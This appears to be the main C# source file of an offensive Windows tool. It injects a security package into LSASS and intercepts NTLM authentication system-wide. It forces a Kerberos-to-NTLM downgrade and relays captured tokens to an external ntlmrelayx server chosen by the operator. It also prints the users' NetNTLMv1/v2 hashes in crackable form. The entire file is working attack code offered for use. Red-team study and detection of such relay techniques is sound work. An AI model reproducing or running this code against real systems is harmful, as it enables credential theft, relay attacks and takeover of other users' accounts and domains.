using NtApiDotNet.Win32.Security.Authentication.Ntlm;
using ntlmrelaylsa;
using ntlmrelaynet.Commands;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using HexDump;
using Mono.Options;
using ntlmrelaynet.Negotiate;
using Asn1;
using System.Diagnostics;
using System.Security.Principal;

namespace ntlmrelaynet {
    class Program {

        static AutoResetEvent serverThreadReady = new AutoResetEvent(false);

        public class NtlmAuth {
            public ulong Context;
            public NtlmRelayChallengeResponse Relayer;
            public NtlmChallengeAuthenticationToken Challenge;
            public NtlmAuthenticateAuthenticationToken Authentication;
            
            public NtlmAuth(ulong context, NtlmRelayChallengeResponse relayer) {
                Context = context;
                Relayer = relayer;
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        internal class SECURITY_PACKAGE_OPTIONS {
            public ulong Size;
            public ulong Type;
            public ulong Flags;
            public ulong SignatureSize;
            public IntPtr Signature;
        }

        [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern int RtlGetVersion(ref OSVERSIONINFOEX versionInfo);
        [StructLayout(LayoutKind.Sequential)]
        internal struct OSVERSIONINFOEX {
            // The OSVersionInfoSize field must be set to Marshal.SizeOf(typeof(OSVERSIONINFOEX))
            internal int OSVersionInfoSize;
            internal int MajorVersion;
            internal int MinorVersion;
            internal int BuildNumber;
            internal int PlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            internal string CSDVersion;
            internal ushort ServicePackMajor;
            internal ushort ServicePackMinor;
            internal short SuiteMask;
            internal byte ProductType;
            internal byte Reserved;
        }

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern uint AddSecurityPackage(string pszPackageName, SECURITY_PACKAGE_OPTIONS Options);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern int FreeLibrary(IntPtr handle);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct SECPKG_FUNCTION_TABLE {
            public IntPtr InitializePackage;
            public IntPtr LogonUser;
            public IntPtr CallPackage;
            public IntPtr LogonTerminated;
            public IntPtr CallPackageUntrusted;
            public IntPtr CallPackagePassthrough;
            public IntPtr LogonUserEx;
            public IntPtr LogonUserEx2;
            public IntPtr Initialize;
            public IntPtr Shutdown;
            public IntPtr GetInfo;
            public IntPtr AcceptCredentials;
            public IntPtr AcquireCredentialsHandle;
            public IntPtr QueryCredentialsAttributes;
            public IntPtr FreeCredentialsHandle;
            public IntPtr SaveCredentials;
            public IntPtr GetCredentials;
            public IntPtr DeleteCredentials;
            public IntPtr InitLsaModeContext;
            public IntPtr AcceptLsaModeContext;
            public IntPtr DeleteContext;
            public IntPtr ApplyControlToken;
            public IntPtr GetUserInfo;
            public IntPtr GetExtendedInformation;
            public IntPtr QueryContextAttributes;
            public IntPtr AddCredentials;
            public IntPtr SetContextAttributes;
            public IntPtr SetCredentialsAttributes;
            public IntPtr ChangeAccountPassword;
            public IntPtr QueryMetaData;
            public IntPtr ExchangeMetaData;
            public IntPtr GetCredUIContext;
            public IntPtr UpdateCredentials;
            public IntPtr ValidateTargetInfo;
            public IntPtr PostLogonUser;
            public IntPtr GetRemoteCredGuardLogonBuffer;
            public IntPtr GetRemoteCredGuardSupplementalCreds;
            public IntPtr GetTbalSupplementalCreds;
            public IntPtr LogonUserEx3;
            public IntPtr PreLogonUserSurrogate;
            public IntPtr PostLogonUserSurrogate;
        }

        delegate int SpLsaModeInitialize(uint lsaVersion, out uint packageVersion, out IntPtr functionTables, out uint tableCount);

        static InitResponse initResponse;

        static Dictionary<ulong, NtlmAuth> activeContext = new Dictionary<ulong, NtlmAuth>();

        static Dictionary<int, Stopwatch> processActivityTracker = new Dictionary<int, Stopwatch>();

        static Dictionary<string, NtlmAuth> cachedNetNTLM = new Dictionary<string, NtlmAuth>();

        static bool passive = false;

        static string host;
        static ushort port = 6666;
          
        static void PrintNTLMv2(NtlmAuth auth, string procName, bool? authSucceed) {

            if (auth == null || auth.Challenge == null || auth.Authentication == null) {

                Console.WriteLine($"[{procName}] Incomplete challenge/response");

            } else {

                if (auth.Authentication is NtlmAuthenticateAuthenticationTokenV2 ntlmAuthv2) {
                    var ntProof = Utils.ByteArrayToString(ntlmAuthv2.NTProofResponse);

                    string ntlmHash = Utils.ByteArrayToString(auth.Authentication.NtChallengeResponse.Skip(16).ToArray());
                    string serverChallengeHex = Utils.ByteArrayToString(auth.Challenge.ServerChallenge);

                    Console.WriteLine($"[{procName}] NTLMv2 Authenticated  : {(authSucceed.HasValue ? authSucceed.Value.ToString() : "N/A")}\n" +
                                      $"[{procName}] NTLMv2 Username       : {auth.Authentication.Domain}\\{auth.Authentication.UserName}\n" +
                                      $"[{procName}] NTLMv2 Hash           : {auth.Authentication.UserName}::{auth.Authentication.Domain}:{serverChallengeHex}:{ntProof}:{ntlmHash}\n");
                } else {

                    string ntlmHash = Utils.ByteArrayToString(auth.Authentication.NtChallengeResponse.Skip(16).ToArray());
                    string serverChallengeHex = Utils.ByteArrayToString(auth.Challenge.ServerChallenge);

                    Console.WriteLine($"[{procName}] NTLMv1 Authenticated  : {(authSucceed.HasValue ? authSucceed.Value.ToString() : "N/A")}\n" +
                                      $"[{procName}] NTLMv1 Username       : {auth.Authentication.Domain}\\{auth.Authentication.UserName}\n" +
                                      $"[{procName}] NTLMv1 Hash           : {auth.Authentication.UserName}::{auth.Authentication.Domain}:{auth.Authentication.NtChallengeResponse}{serverChallengeHex}\n");
                }
            }
        }

        static bool DoPassiveMode(int requestPID) {

            bool doPassive = passive;

            if (!doPassive) {
                if (processActivityTracker.ContainsKey(requestPID)) {
  
                    if (processActivityTracker[requestPID].IsRunning && processActivityTracker[requestPID].ElapsedMilliseconds < 1000) {
                        doPassive = true;
                    } else {
                        processActivityTracker[requestPID].Reset();
                    }

                } else {
                    var timer = new Stopwatch();
                    processActivityTracker[requestPID] = timer;
                }
            }

            return doPassive;
        }

        static void TriggerAuthTimer(int requestPID) {
            if (processActivityTracker.ContainsKey(requestPID)) {
                processActivityTracker[requestPID].Start();
            }
        }

        static BitseryObject ProcessRelayRequest(RelayRequest relayRequest) {

            var token = NtlmAuthenticationToken.Parse(relayRequest.Token);
            BitseryObject lsaResponse;
            bool doPassive = DoPassiveMode(relayRequest.ProcessID);

            if (token is NtlmNegotiateAuthenticationToken) {

                var newAuthContext = new NtlmAuth(relayRequest.Context, !doPassive ? new NtlmRelayChallengeResponse(host, port) : null);             
                activeContext[newAuthContext.Context] = newAuthContext;

                if (!doPassive) {
                    var relayResponse = newAuthContext.Relayer.GetChallengeToken(relayRequest.Token);

                    if (relayResponse.Length > 0) {
                        lsaResponse = new RelayChallengeResponse(relayResponse);
                        newAuthContext.Challenge = (NtlmChallengeAuthenticationToken)NtlmAuthenticationToken.Parse(relayResponse);
                    } else {
                        Console.WriteLine($"[!] Failed to relay NTLM Type 1 and get challenge");
                        lsaResponse = new RelayChallengeResponse(RelayStatus.Passive);
                    }

                } else {
                    lsaResponse = new RelayChallengeResponse(RelayStatus.Passive);
                }

            } else if (token is NtlmAuthenticateAuthenticationToken ntlmAuthenticate) {

                if (!activeContext.ContainsKey(relayRequest.Context)) {
                    Console.WriteLine($"[!] Couldn't find existing relay session for context with id 0x{relayRequest.Context:x}");
                    lsaResponse = new RelayCompleteResponse(RelayStatus.Passive);

                } else {
                   
                    var authContext = activeContext[relayRequest.Context];
                    activeContext.Remove(relayRequest.Context);
                    authContext.Authentication = ntlmAuthenticate;
                    bool? success = null;
                    string userName = $"{ntlmAuthenticate.Domain}\\{ntlmAuthenticate.UserName}";

                    if (!doPassive && !string.IsNullOrEmpty(ntlmAuthenticate.UserName)) {
                        success = authContext.Relayer.SendAuthenticateToken(relayRequest.Token);
                        PrintNTLMv2(authContext, relayRequest.Process.ProcessName, success);

                        UserInfo userInfo = new UserInfo(ntlmAuthenticate.UserName, ntlmAuthenticate.Domain);

                        if (!userInfo.PopulateFromLDAP()) {
                            //Failed find user in LDAP so lets assume a local admin for now
                            userInfo.SecurityIdentifier = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
                            userInfo.PrimaryGroupId = 500;
                            userInfo.Groups.Add(new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null));
                            userInfo.Groups.Add(new SecurityIdentifier(WellKnownSidType.BuiltinRemoteDesktopUsersSid, null));
                        }

                        lsaResponse = new RelayCompleteResponse(success.Value ? RelayStatus.AuthSuccess : RelayStatus.AuthFailed, ntlmAuthenticate.Workstation, userInfo);
                        TriggerAuthTimer(relayRequest.ProcessID);

                    } else {
                        lsaResponse = new RelayCompleteResponse(RelayStatus.Passive, ntlmAuthenticate.Workstation, new UserInfo(ntlmAuthenticate.UserName, ntlmAuthenticate.Domain));
                    }

                    if (!cachedNetNTLM.ContainsKey(userName)) {
                        cachedNetNTLM.Add(userName, authContext);
                        PrintNTLMv2(authContext, relayRequest.Process.ProcessName, success);
                    }                    
                }

            } else if (token is NtlmChallengeAuthenticationToken challengeToken) {

                if (activeContext.ContainsKey(relayRequest.Context)) {
                    activeContext[relayRequest.Context].Challenge = challengeToken;
                } else {
                    Console.WriteLine("[!] Got passive NTLM challenge message without a valid context");
                }

                lsaResponse = new RelayChallengeResponse(RelayStatus.Passive);

            } else {
                throw new InvalidOperationException("[!] Unexpected NTLM message type received from relay server");
            }

            return lsaResponse;
        }

        static BitseryObject ProcessNegotiateToken(NegotiateRequest negotiateRequest) {

            if (negotiateRequest.Token != null && !DoPassiveMode(negotiateRequest.ProcessID)) {

                AsnElt asnToken = null;

                try {

                    asnToken = AsnElt.Decode(negotiateRequest.Token);
                    var negTokenInit = new NegTokenInit(AsnElt.Decode(negotiateRequest.Token));

                    if (negTokenInit.MechTypes != null && negTokenInit.MechTypes.Count > 0 && negTokenInit.MechTypes[0].Value != NegToken.MechTypeNTLM.Value) {

                        if (negTokenInit.MechToken != null && negTokenInit.MechToken.Length > 0) {

                            if (negTokenInit.MechTypes[0].Value != NegToken.MechTypeNTLM.Value) {
                                Console.WriteLine($"[{negotiateRequest.Process.ProcessName}] Received non NTLM NegTokenInit, peforming NTLM downgrade");
                                NegTokenResponse tokenResponse = new NegTokenResponse(State.RequestMic, NegToken.MechTypeNTLM);
                                return new NegotiateResponse(tokenResponse.Encode(), RelayStatus.Forward);
                            }

                        } else {
                            NegTokenInit tokenResponse = new NegTokenInit();
                            tokenResponse.MechTypes.Add(NegToken.MechTypeNTLM);
                            return new NegotiateResponse(tokenResponse.Encode(), RelayStatus.Replace);
                        }
                    }

                } catch (FormatException) { // It wasn't a NegTokenInit token, so attempt to parse a response instead

                    try {
                        
                        var negTokenResp = new NegTokenResponse(asnToken);

                        if (negTokenResp.NegState == State.AcceptIncomplete && negTokenResp.ResponseToken != null) {

                            try {
                                
                                var ntlmToken = NtlmAuthenticationToken.Parse(negTokenResp.ResponseToken);
                                if(ntlmToken is NtlmNegotiateAuthenticationToken) {
                                    NegTokenInit tokenResponse = new NegTokenInit();
                                    tokenResponse.MechToken = negTokenResp.ResponseToken;
                                    tokenResponse.MechTypes.Add(NegToken.MechTypeNTLM);
                                    Console.WriteLine($"[{negotiateRequest.Process.ProcessName}] Received negTokenResponse with NTLM token, downgrade successful.");
                                    return new NegotiateResponse(tokenResponse.Encode(), RelayStatus.Replace);
                                }

                            }catch(Exception) {} //Not an NTLM negotiate mechToken.... fall through
                        } 
                        
                    } catch (FormatException) { } //It's not a response token either.... fall through

                } catch (AsnException) { } //Failed to decode Negotiate token, so just fall through
            }
          
            return new NegotiateResponse(RelayStatus.Passive);            
        }
                
        static void ServerThread() {
                
            using (NamedPipeServerStream serverStream = new NamedPipeServerStream("lsarelayx", PipeDirection.InOut, 10, PipeTransmissionMode.Byte)) {

                serverThreadReady.Set();

                while (true) {

                    try {

                        serverStream.WaitForConnection();
                        var command = BitseryObject.ReadFromStream(serverStream);

                        if (command is InitRequest) {
                            Console.WriteLine($"[+] Init command received from LSA");
                            initResponse.WriteToStream(serverStream);
                   
                        } else if (command is RelayRequest relayRequest) {
                            
                            var relayResponse = ProcessRelayRequest(relayRequest);
                            relayResponse.WriteToStream(serverStream);                            

                        } else if (command is NegotiateRequest negotiateRequest) {

                            var response = ProcessNegotiateToken(negotiateRequest);
                            response.WriteToStream(serverStream);

                        }

                        serverStream.Flush();

                    } catch (Exception e) {

                        Console.WriteLine($"[!] Pipe disconnected with error {e.Message}");
       
                    } finally {
                        try {
                            serverStream.WaitForPipeDrain();
                        } catch (Exception) { 

                        } finally {
                            serverStream.Disconnect();
                        }
                    }
                }
            }
        }


        //https://stackoverflow.com/questions/283456/byte-array-pattern-search
        static List<int> IndexOfSequence(byte[] buffer, byte[] pattern, int startIndex) {
            List<int> positions = new List<int>();
            int i = Array.IndexOf<byte>(buffer, pattern[0], startIndex);
            while (i >= 0 && i <= buffer.Length - pattern.Length) {
                byte[] segment = new byte[pattern.Length];
                Buffer.BlockCopy(buffer, i, segment, 0, pattern.Length);
                if (segment.SequenceEqual<byte>(pattern))
                    positions.Add(i);
                i = Array.IndexOf<byte>(buffer, pattern[0], i + 1);
            }
            return positions;
        }

        static int GetSpmpLookupPackageOffset() {

            OSVERSIONINFOEX versionInfo = new OSVERSIONINFOEX();
            var lsaSrvBytes = File.ReadAllBytes($@"{Environment.SystemDirectory}\lsasrv.dll");
            byte[] functionSignature = null;

            RtlGetVersion(ref versionInfo);

            if (versionInfo.MajorVersion == 10) {

                //Windows 10 (possibly 2019 Server?)
                functionSignature = new byte[] {
                    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89,
                    0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04,
                    0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xE9, 0x8b, 0x15};

            } else if (versionInfo.MajorVersion == 6 && versionInfo.MinorVersion == 3){

                //Windows 2012 R2 / Windows 8.1 
                functionSignature = new byte[] {
                    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89,
                    0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04,
                    0x25, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x15};

            }else {
                Console.WriteLine($"[=] No signature for operating system with version {versionInfo.MajorVersion}.{versionInfo.MinorVersion}.{versionInfo.BuildNumber}, use --lookuppackage-hint to supply the offset");
                return 0;
            }     
    
            var offsets = IndexOfSequence(lsaSrvBytes, functionSignature, 0);
            var foundOffset = 0;

            if (offsets.Count == 0 || offsets.Count > 1) {
                if (offsets.Count == 0) {
                    Console.WriteLine("[=] Unable to find GetSpmpLookupPackage function, Negotiate NTLM downgrade will not work");
                } else {

                    foreach (var offset in offsets) {
                        if (lsaSrvBytes.Skip(offset + functionSignature.Length + 4).Take(4).SequenceEqual(new byte[] { 0x48, 0x8b, 0xe9 })) {
                            foundOffset = offset;
                            break;
                        }
                    }

                    if (foundOffset == 0) {
                        Console.WriteLine($"[=] Multiple ({offsets.Count}) signatures found for SpmpLookupPackage, cannot automatically determine offset");
                        return 0;
                    }
                }
            } else 
                foundOffset = offsets[0];

            //TODO: Ideally need to parse the PE headers and find where .text start.
            // For now lets assume .text is first section so remove raw address and add virtual address.
            return (foundOffset - 0x400) + 0x1000;
           
        }

        static InitResponse GetFunctionOffsets(long spmpLookupPackageOffsetHint) {

            IntPtr msvHandle = IntPtr.Zero;

            try {

                msvHandle = LoadLibrary("msv1_0.dll");

                if (msvHandle == IntPtr.Zero) {
                    Console.WriteLine("Failed to load msv1_0.dll");
                    return null;
                }

                long msvBase = (long)msvHandle;

                IntPtr proc = GetProcAddress(msvHandle, "SpLsaModeInitialize");
                if (proc == IntPtr.Zero) {
                    Console.WriteLine("Failed to find msv1_0 SpLsaModeInitialize proc");
                    return null;
                }

                var spLsaModeInitialize = (SpLsaModeInitialize)Marshal.GetDelegateForFunctionPointer(proc, typeof(SpLsaModeInitialize));

                if (spLsaModeInitialize(0x10000, out uint version, out IntPtr tables, out uint tableCount) != 0) {
                    Console.WriteLine("SpLsaModeInitialize failed for msv1_0");
                    return null;
                }


                long spmpLookupPackageOffset = 0;

                if (spmpLookupPackageOffsetHint == 0) { 
                    spmpLookupPackageOffset = GetSpmpLookupPackageOffset();
                }else {
                    Console.WriteLine("[=] Using supplied SpLsaModeInitialize hint, you get this wrong and LSASS WILL CRASH!!!");
                    spmpLookupPackageOffset = spmpLookupPackageOffsetHint;
                }

                var table = (SECPKG_FUNCTION_TABLE)Marshal.PtrToStructure(tables, typeof(SECPKG_FUNCTION_TABLE));

                return new InitResponse((long)table.InitLsaModeContext - msvBase,
                    (long)table.AcceptLsaModeContext - msvBase,
                    (long)table.QueryContextAttributes - msvBase,
                    (long)table.DeleteContext - msvBase,
                    (long)table.QueryCredentialsAttributes - msvBase,
                    spmpLookupPackageOffset);

            } finally {

                if(msvHandle != IntPtr.Zero) {
                    FreeLibrary(msvHandle);
                }
            }
        }

        public static byte[] StringToByteArray(string hex) {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }


        static void Main(string[] args) {

            bool showHelp = false;
            long spmpLookupPackageOffset = 0;

            OptionSet option_set = new OptionSet()
                .Add("host=", "Address of ntlmrelayx RAW server", v => host = v)
                .Add<ushort>("port=", "Port for ntlmrelayx RAW server (default 6666)", v => port = v)
                .Add("lookuppackage-hint=", "Hex value offset to SpmpLookupPackage (useful if cannot be found automatically", v => spmpLookupPackageOffset = int.Parse(v, System.Globalization.NumberStyles.HexNumber))
                .Add("passive", "Operate in a passive mode and sniff NetNTLM hashes only", v => passive = true)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    option_set.WriteOptionDescriptions(Console.Out);
                    return;
                }              

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            if(host == null) {
                Console.WriteLine("[=] No host supplied, switching to passive mode");
                passive = true;
            } else {
                Console.WriteLine($"[+] Using {host}:{port} for relaying NTLM connections");
            }

            var serverThread = new Thread(ServerThread);
            serverThread.Start();
            serverThreadReady.WaitOne();

            initResponse = GetFunctionOffsets(spmpLookupPackageOffset);

            if(initResponse == null) {
                return;
            }
 
            SECURITY_PACKAGE_OPTIONS spo = new SECURITY_PACKAGE_OPTIONS();
          
            string lsaDllPath = new FileInfo("liblsarelayx.dll").FullName;

            if (File.Exists(lsaDllPath)) {
                Console.WriteLine($"[=] Attempting to load LSA plugin {lsaDllPath}");
                uint result = AddSecurityPackage(lsaDllPath, spo);

                if (result != 0) {
                    Console.WriteLine($"[!] Failed to add LSA security package with error 0x{result:x}");
                }

            } else {
                Console.WriteLine($"[!] {lsaDllPath} not found");

            }


            Console.ReadLine();       
        }
    }
}
